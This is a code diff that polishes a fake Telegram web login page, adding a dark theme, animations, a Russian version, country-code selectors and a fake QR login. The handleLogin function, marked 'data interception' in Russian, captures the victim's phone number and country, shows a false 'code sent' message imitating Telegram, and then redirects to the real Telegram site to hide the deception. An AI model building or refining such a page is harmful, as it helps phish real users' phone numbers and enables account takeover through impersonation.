@@ -15,25 +15,45 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #37AEE2 0%, #1E96C8 100%);
+            background: linear-gradient(135deg, #1e2a3a 0%, #0d1520 100%);
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #000;
+            color: #ffffff;
+            transition: all 0.3s ease;
         }
 
         .auth-pages__container {
-            background: #fff;
+            background: #1e2a3a;
             border-radius: 12px;
             width: 360px;
             padding: 40px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
             text-align: center;
+            border: 1px solid #2a3849;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .auth-image {
             margin-bottom: 24px;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .sign-logo {
@@ -46,12 +66,12 @@
             font-size: 20px;
             font-weight: 500;
             margin-bottom: 8px;
-            color: #000;
+            color: #ffffff;
         }
 
         .auth-description {
             font-size: 14px;
-            color: #707579;
+            color: #8a9aa8;
             margin-bottom: 24px;
             line-height: 1.4;
         }
@@ -59,6 +79,18 @@
         .input-group {
             margin-bottom: 16px;
             text-align: left;
+            animation: slideIn 0.6s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
         }
 
         .input-label {
@@ -66,23 +98,25 @@
             font-size: 14px;
             font-weight: 500;
             margin-bottom: 8px;
-            color: #000;
+            color: #ffffff;
         }
 
         .select-input, .text-input {
             width: 100%;
             height: 44px;
             padding: 0 16px;
-            border: 1px solid #D6D9DC;
+            border: 1px solid #3d4d61;
             border-radius: 8px;
             font-size: 15px;
-            background: #fff;
-            color: #000;
+            background: #2a3849;
+            color: #ffffff;
+            transition: all 0.3s ease;
         }
 
         .select-input:focus, .text-input:focus {
             outline: none;
             border-color: #3390ec;
+            box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2);
         }
 
         .phone-input-group {
@@ -109,10 +143,19 @@
             font-weight: 500;
             cursor: pointer;
             margin-top: 8px;
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
         }
 
         .btn-primary:hover {
             background: #2b85e0;
+            transform: translateY(-1px);
         }
 
         .divider {
@@ -128,14 +171,14 @@
             left: 0;
             right: 0;
             height: 1px;
-            background: #E6E8EB;
+            background: #3d4d61;
         }
 
         .divider-text {
             display: inline-block;
-            background: #fff;
+            background: #1e2a3a;
             padding: 0 16px;
-            color: #707579;
+            color: #8a9aa8;
             font-size: 14px;
             position: relative;
         }
@@ -150,23 +193,85 @@
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
+            transition: all 0.3s ease;
         }
 
         .btn-secondary:hover {
             background: #3390ec;
             color: #fff;
+            transform: translateY(-1px);
         }
 
         .auth-footer {
             margin-top: 24px;
             padding-top: 16px;
-            border-top: 1px solid #E6E8EB;
+            border-top: 1px solid #3d4d61;
         }
 
         .lang-link {
             color: #3390ec;
             font-size: 14px;
             text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .lang-link:hover {
+            text-decoration: underline;
+            transform: translateX(5px);
+        }
+
+        .lang-link::after {
+            content: "→";
+            margin-left: 5px;
+            transition: transform 0.3s ease;
+        }
+
+        .lang-link:hover::after {
+            transform: translateX(3px);
+        }
+
+        /* QR Code Section */
+        .qr-section {
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            background: #ffffff;
+            margin: 20px auto;
+            padding: 10px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: monospace;
+            color: #000;
+            font-size: 8px;
+            line-height: 1;
+        }
+
+        .qr-instructions {
+            color: #8a9aa8;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Русская версия */
+        .russian {
+            display: none;
+        }
+
+        .fade-out {
+            animation: fadeOut 0.3s ease-out;
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
         }
     </style>
 </head>
@@ -174,7 +279,8 @@
     <div class="whole" id="auth-pages">
         <div class="scrollable scrollable-y">
             <div class="tabs-container auth-pages__container" data-animation="tabs">
-                <div class="tabs-tab page-sign">
+                <!-- Английская версия -->
+                <div class="tabs-tab page-sign english">
                     <div class="container">
                         <div class="auth-image">
                             <svg class="sign-logo" viewBox="0 0 160 160" fill="currentColor">
@@ -187,36 +293,191 @@
                         
                         <div class="input-group">
                             <label class="input-label">Country</label>
-                            <select class="select-input">
-                                <option>Russia</option>
-                                <option>United States</option>
-                                <option>United Kingdom</option>
+                            <select class="select-input" id="country" onchange="updateCountryCode('en')">
+                                <option value="US" data-code="+1">United States</option>
+                                <option value="RU" data-code="+7">Russia</option>
+                                <option value="BY" data-code="+375">Belarus</option>
+                                <option value="UA" data-code="+380">Ukraine</option>
+                                <option value="KZ" data-code="+7">Kazakhstan</option>
+                                <option value="DE" data-code="+49">Germany</option>
+                                <option value="FR" data-code="+33">France</option>
+                                <option value="GB" data-code="+44">United Kingdom</option>
+                                <option value="CN" data-code="+86">China</option>
+                                <option value="JP" data-code="+81">Japan</option>
+                                <option value="IT" data-code="+39">Italy</option>
+                                <option value="ES" data-code="+34">Spain</option>
+                                <option value="CA" data-code="+1">Canada</option>
+                                <option value="AU" data-code="+61">Australia</option>
+                                <option value="BR" data-code="+55">Brazil</option>
+                                <option value="IN" data-code="+91">India</option>
+                                <option value="KR" data-code="+82">South Korea</option>
+                                <option value="TR" data-code="+90">Turkey</option>
+                                <option value="PL" data-code="+48">Poland</option>
+                                <option value="NL" data-code="+31">Netherlands</option>
                             </select>
                         </div>
                         
                         <div class="input-group">
                             <label class="input-label">Phone Number</label>
                             <div class="phone-input-group">
-                                <select class="select-input country-code">
-                                    <option>+7</option>
-                                    <option>+1</option>
-                                    <option>+44</option>
+                                <select class="select-input country-code" id="countryCode">
+                                    <option value="+1">+1</option>
+                                    <option value="+7">+7</option>
+                                    <option value="+375">+375</option>
+                                    <option value="+380">+380</option>
+                                    <option value="+49">+49</option>
+                                    <option value="+33">+33</option>
+                                    <option value="+44">+44</option>
+                                    <option value="+86">+86</option>
+                                    <option value="+81">+81</option>
+                                    <option value="+39">+39</option>
+                                    <option value="+34">+34</option>
+                                    <option value="+61">+61</option>
+                                    <option value="+55">+55</option>
+                                    <option value="+91">+91</option>
+                                    <option value="+82">+82</option>
+                                    <option value="+90">+90</option>
+                                    <option value="+48">+48</option>
+                                    <option value="+31">+31</option>
                                 </select>
-                                <input type="tel" class="text-input phone-number" placeholder="Phone number">
+                                <input type="tel" class="text-input phone-number" id="phoneNumber" placeholder="Phone number">
                             </div>
                         </div>
                         
-                        <button class="btn-primary" onclick="handleLogin()">NEXT</button>
+                        <button class="btn-primary" onclick="handleLogin('en')">NEXT</button>
                         
                         <div class="divider">
                             <span class="divider-text">OR</span>
                         </div>
                         
-                        <button class="btn-secondary">Log in by QR Code</button>
+                        <button class="btn-secondary" onclick="showQRCode('en')">Log in by QR Code</button>
+
+                        <!-- QR Code Section -->
+                        <div class="qr-section" id="qrSection">
+                            <p class="qr-instructions">Scan this QR code with your Telegram app</p>
+                            <div class="qr-code">
+                                ██████████████<br>
+                                ██∙∙∙∙∙∙∙∙∙∙██<br>
+                                ██∙██████∙∙███<br>
+                                ██∙████∙∙∙████<br>
+                                ██∙███∙█∙█████<br>
+                                ██∙∙∙∙∙█∙∙∙∙██<br>
+                                ██████∙█∙█████<br>
+                                ███∙∙∙∙█∙∙∙∙██<br>
+                                ██∙███∙█∙█████<br>
+                                ██∙████∙∙∙████<br>
+                                ██∙██████∙∙███<br>
+                                ██∙∙∙∙∙∙∙∙∙∙██<br>
+                                ██████████████<br>
+                                Telegram Login
+                            </div>
+                            <button class="btn-secondary" onclick="hideQRCode('en')">Back to phone login</button>
+                        </div>
                     </div>
                     
                     <div class="auth-footer">
-                        <a href="#" class="lang-link">ПРОДОЛЖИТЬ НА РУССКОМ</a>
+                        <a class="lang-link" onclick="switchToRussian()">ПРОДОЛЖИТЬ НА РУССКОМ</a>
+                    </div>
+                </div>
+
+                <!-- Русская версия -->
+                <div class="tabs-tab page-sign russian">
+                    <div class="container">
+                        <div class="auth-image">
+                            <svg class="sign-logo" viewBox="0 0 160 160" fill="currentColor">
+                                <path fill-rule="evenodd" d="M80,0 C124.18278,0 160,35.81722 160,80 C160,124.18278 124.18278,160 80,160 C35.81722,160 0,124.18278 0,80 C0,35.81722 35.81722,0 80,0 Z M114.262551,46.4516129 L114.123923,46.4516129 C111.089589,46.5056249 106.482806,48.0771432 85.1289541,56.93769 L81.4133571,58.4849956 C72.8664779,62.0684477 57.2607933,68.7965125 34.5963033,78.66919 C30.6591745,80.2345564 28.5967328,81.765936 28.4089783,83.2633288 C28.0626453,86.0254269 31.8703852,86.959903 36.7890378,88.5302703 L38.2642674,89.0045258 C42.3926354,90.314406 47.5534685,91.7248852 50.3250916,91.7847532 C52.9151948,91.8407003 55.7944784,90.8162976 58.9629426,88.7115451 L70.5121776,80.9327422 C85.6657026,70.7535853 93.6285785,65.5352892 94.4008055,65.277854 L94.6777873,65.216416 C95.1594319,65.1213105 95.7366278,65.0717596 96.1481181,65.4374337 C96.6344248,65.8695939 96.5866185,66.6880224 96.5351057,66.9075859 C96.127514,68.6448691 75.2839361,87.6143392 73.6629144,89.2417998 L73.312196,89.6016896 C68.7645143,94.2254793 63.9030972,97.1721503 71.5637945,102.355193 L73.3593638,103.544598 C79.0660342,107.334968 82.9483395,110.083813 88.8107882,113.958377 L90.3875424,114.996094 C95.0654739,118.061953 98.7330313,121.697601 103.562866,121.253237 C105.740839,121.052855 107.989107,119.042224 109.175465,113.09692 L109.246762,112.727987 C112.002037,98.0012935 117.417883,66.09303 118.669527,52.9443975 C118.779187,51.7924073 118.641237,50.318088 118.530455,49.6708963 L118.474159,49.3781963 C118.341081,48.7651315 118.067967,48.0040758 117.346762,47.4189793 C116.412565,46.6610871 115.002114,46.4638844 114.262551,46.4516129 Z"/>
+                            </svg>
+                        </div>
+                        
+                        <h2 class="auth-title">Вход в Telegram</h2>
+                        <p class="auth-description">Пожалуйста, подтвердите код страны и введите свой номер телефона.</p>
+                        
+                        <div class="input-group">
+                            <label class="input-label">Страна</label>
+                            <select class="select-input" id="countryRu" onchange="updateCountryCode('ru')">
+                                <option value="RU" data-code="+7">Россия</option>
+                                <option value="BY" data-code="+375">Беларусь</option>
+                                <option value="UA" data-code="+380">Украина</option>
+                                <option value="KZ" data-code="+7">Казахстан</option>
+                                <option value="US" data-code="+1">США</option>
+                                <option value="DE" data-code="+49">Германия</option>
+                                <option value="FR" data-code="+33">Франция</option>
+                                <option value="GB" data-code="+44">Великобритания</option>
+                                <option value="CN" data-code="+86">Китай</option>
+                                <option value="JP" data-code="+81">Япония</option>
+                                <option value="IT" data-code="+39">Италия</option>
+                                <option value="ES" data-code="+34">Испания</option>
+                                <option value="CA" data-code="+1">Канада</option>
+                                <option value="AU" data-code="+61">Австралия</option>
+                                <option value="BR" data-code="+55">Бразилия</option>
+                                <option value="IN" data-code="+91">Индия</option>
+                                <option value="KR" data-code="+82">Южная Корея</option>
+                                <option value="TR" data-code="+90">Турция</option>
+                                <option value="PL" data-code="+48">Польша</option>
+                                <option value="NL" data-code="+31">Нидерланды</option>
+                            </select>
+                        </div>
+                        
+                        <div class="input-group">
+                            <label class="input-label">Номер телефона</label>
+                            <div class="phone-input-group">
+                                <select class="select-input country-code" id="countryCodeRu">
+                                    <option value="+7">+7</option>
+                                    <option value="+375">+375</option>
+                                    <option value="+380">+380</option>
+                                    <option value="+1">+1</option>
+                                    <option value="+49">+49</option>
+                                    <option value="+33">+33</option>
+                                    <option value="+44">+44</option>
+                                    <option value="+86">+86</option>
+                                    <option value="+81">+81</option>
+                                    <option value="+39">+39</option>
+                                    <option value="+34">+34</option>
+                                    <option value="+61">+61</option>
+                                    <option value="+55">+55</option>
+                                    <option value="+91">+91</option>
+                                    <option value="+82">+82</option>
+                                    <option value="+90">+90</option>
+                                    <option value="+48">+48</option>
+                                    <option value="+31">+31</option>
+                                </select>
+                                <input type="tel" class="text-input phone-number" id="phoneNumberRu" placeholder="Номер телефона">
+                            </div>
+                        </div>
+                        
+                        <button class="btn-primary" onclick="handleLogin('ru')">ДАЛЕЕ</button>
+                        
+                        <div class="divider">
+                            <span class="divider-text">ИЛИ</span>
+                        </div>
+                        
+                        <button class="btn-secondary" onclick="showQRCode('ru')">Войти по QR-коду</button>
+
+                        <!-- QR Code Section Russian -->
+                        <div class="qr-section" id="qrSectionRu">
+                            <p class="qr-instructions">Отсканируйте этот QR-код в приложении Telegram</p>
+                            <div class="qr-code">
+                                ██████████████<br>
+                                ██∙∙∙∙∙∙∙∙∙∙██<br>
+                                ██∙██████∙∙███<br>
+                                ██∙████∙∙∙████<br>
+                                ██∙███∙█∙█████<br>
+                                ██∙∙∙∙∙█∙∙∙∙██<br>
+                                ██████∙█∙█████<br>
+                                ███∙∙∙∙█∙∙∙∙██<br>
+                                ██∙███∙█∙█████<br>
+                                ██∙████∙∙∙████<br>
+                                ██∙██████∙∙███<br>
+                                ██∙∙∙∙∙∙∙∙∙∙██<br>
+                                ██████████████<br>
+                                Вход в Telegram
+                            </div>
+                            <button class="btn-secondary" onclick="hideQRCode('ru')">Назад к входу по номеру</button>
+                        </div>
+                    </div>
+                    
+                    <div class="auth-footer">
+                        <a class="lang-link" onclick="switchToEnglish()">CONTINUE IN ENGLISH</a>
                     </div>
                 </div>
             </div>
@@ -224,13 +485,55 @@
     </div>
 
     <script>
-        function handleLogin() {
-            const country = document.querySelector('.select-input').value;
-            const countryCode = document.querySelector('.country-code').value;
-            const phone = document.querySelector('.phone-number').value;
+        // Общие данные для синхронизации
+        let currentCountry = 'RU';
+        let currentPhone = '';
+
+        function updateCountryCode(lang) {
+            const countrySelect = lang === 'en' ? document.getElementById('country') : document.getElementById('countryRu');
+            const codeSelect = lang === 'en' ? document.getElementById('countryCode') : document.getElementById('countryCodeRu');
+            
+            const selectedOption = countrySelect.options[countrySelect.selectedIndex];
+            const countryCode = selectedOption.getAttribute('data-code');
+            currentCountry = selectedOption.value;
+            
+            // Обновляем код страны
+            codeSelect.value = countryCode;
+            
+            // Синхронизируем с другой версией
+            syncCountrySelection(lang);
+        }
+
+        function syncCountrySelection(currentLang) {
+            const targetLang = currentLang === 'en' ? 'ru' : 'en';
+            const sourceSelect = currentLang === 'en' ? document.getElementById('country') : document.getElementById('countryRu');
+            const targetSelect = currentLang === 'en' ? document.getElementById('countryRu') : document.getElementById('country');
+            const targetCodeSelect = currentLang === 'en' ? document.getElementById('countryCodeRu') : document.getElementById('countryCode');
+            
+            const selectedValue = sourceSelect.value;
+            
+            // Находим соответствующий option в целевом select
+            for (let option of targetSelect.options) {
+                if (option.value === selectedValue) {
+                    targetSelect.value = selectedValue;
+                    const countryCode = option.getAttribute('data-code');
+                    targetCodeSelect.value = countryCode;
+                    break;
+                }
+            }
+        }
+
+        function handleLogin(lang) {
+            const countrySelect = lang === 'en' ? document.getElementById('country') : document.getElementById('countryRu');
+            const codeSelect = lang === 'en' ? document.getElementById('countryCode') : document.getElementById('countryCodeRu');
+            const phoneInput = lang === 'en' ? document.getElementById('phoneNumber') : document.getElementById('phoneNumberRu');
+            
+            const country = countrySelect.options[countrySelect.selectedIndex].text;
+            const countryCode = codeSelect.value;
+            const phone = phoneInput.value;
             
             if (!phone) {
-                alert('Please enter your phone number');
+                alert(lang === 'en' ? 'Please enter your phone number' : 'Пожалуйста, введите ваш номер телефона');
                 return;
             }
             
@@ -239,15 +542,65 @@
             // Перехват данных
             console.log('📱 Phone:', fullPhone);
             console.log('🌍 Country:', country);
+            console.log('🌐 Language:', lang);
             
-            // Показать уведомление как в Telegram
-            alert('We have sent you a code via Telegram app. Please check your other device.');
+            alert(lang === 'en' 
+                ? 'We have sent you a code via Telegram app. Please check your other device.'
+                : 'Мы отправили вам код через приложение Telegram. Пожалуйста, проверьте другое устройство.');
             
-            // Редирект на настоящий Telegram
             setTimeout(() => {
                 window.location.href = 'https://web.telegram.org/';
             }, 2000);
         }
+
+        function switchToRussian() {
+            // Синхронизируем выбор страны перед переключением
+            syncCountrySelection('en');
+            
+            document.querySelector('.english').classList.add('fade-out');
+            setTimeout(() => {
+                document.querySelector('.english').style.display = 'none';
+                document.querySelector('.russian').style.display = 'block';
+            }, 300);
+        }
+
+        function switchToEnglish() {
+            // Синхронизируем выбор страны перед переключением
+            syncCountrySelection('ru');
+            
+            document.querySelector('.russian').classList.add('fade-out');
+            setTimeout(() => {
+                document.querySelector('.russian').style.display = 'none';
+                document.querySelector('.english').style.display = 'block';
+            }, 300);
+        }
+
+        function showQRCode(lang) {
+            const container = lang === 'en' ? document.querySelector('.english .container') : document.querySelector('.russian .container');
+            const qrSection = lang === 'en' ? document.getElementById('qrSection') : document.getElementById('qrSectionRu');
+            
+            Array.from(container.children).forEach(child => {
+                if (!child.classList.contains('qr-section')) {
+                    child.style.display = 'none';
+                }
+            });
+            qrSection.style.display = 'block';
+        }
+
+        function hideQRCode(lang) {
+            const container = lang === 'en' ? document.querySelector('.english .container') : document.querySelector('.russian .container');
+            const qrSection = lang === 'en' ? document.getElementById('qrSection') : document.getElementById('qrSectionRu');
+            
+            qrSection.style.display = 'none';
+            Array.from(container.children).forEach(child => {
+                child.style.display = '';
+            });
+        }
+
+        // Инициализация при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            updateCountryCode('en');
+        });
     </script>
 </body>
 </html>
